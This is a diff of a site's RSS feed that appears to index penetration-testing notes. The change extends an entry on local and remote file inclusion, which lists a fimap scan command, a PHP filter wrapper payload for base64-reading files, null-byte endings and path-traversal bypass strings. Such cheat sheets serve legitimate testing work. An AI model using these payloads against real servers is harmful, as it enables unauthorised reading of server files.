@@ -231,7 +231,7 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/lfi/</guid>
-      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Tricks #   PHP Filter b64 Nullbyte ending (%00) 403bypass section may help  Bypasses #  .// .\/ ./\ .\\ </description>
+      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Tricks #   PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help  Bypasses #  .// .\/ ./\ .\\ </description>
     </item>
     
     <item>
